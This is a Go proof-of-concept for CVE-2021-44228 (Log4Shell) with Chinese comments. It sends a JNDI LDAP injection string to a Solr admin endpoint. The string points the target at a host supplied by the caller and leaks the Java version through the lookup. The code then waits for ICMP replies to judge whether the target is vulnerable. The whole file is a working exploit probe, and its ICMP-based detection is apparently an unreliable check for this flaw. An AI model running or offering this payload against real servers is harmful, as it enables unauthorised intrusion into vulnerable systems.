package poc

import (
	"fmt"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"net"
	"net/http"
	"sync"
	"time"
)

func CVE_2021_44228(URL string, localIP string) bool {
	// 监听ICMP回包
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		fmt.Println("无法监听ICMP回包:", err)
		return false
	}
	defer conn.Close()

	buf := make([]byte, 1024)

	maliciousURL := fmt.Sprintf("%s/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.%s}", URL, localIP)

	// 使用 WaitGroup 确保 HTTP 请求已经发出
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		resp, err := http.Get(maliciousURL)
		if err != nil {
			fmt.Println("URL 发送请求失败:", err)
			return
		}
		defer resp.Body.Close()
	}()

	// 等待 HTTP 请求发出
	wg.Wait()

	fmt.Printf("向 %s 发送请求\n", maliciousURL)

	// 开始监听 ICMP 回包
	for {
		// 设置超时
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		n, peer, err := conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Println("超时，没有收到ICMP回包")
				return false
			}
			fmt.Printf("读取数据包错误: %v\n", err)
			continue
		}

		// 解析ICMP消息
		msg, err := icmp.ParseMessage(ipv4.ICMPTypeEcho.Protocol(), buf[:n])
		if err != nil {
			fmt.Printf("解析ICMP消息错误: %v\n", err)
			continue
		}

		// 处理ICMP消息
		switch msg.Type {
		case ipv4.ICMPTypeEchoReply:
			fmt.Printf("收到来自 %v 的ICMP Echo 回复\n", peer)
			return true
		default:
			fmt.Printf("收到非Echo回复的ICMP消息: %v\n", msg.Type)
			return false
		}
	}
}
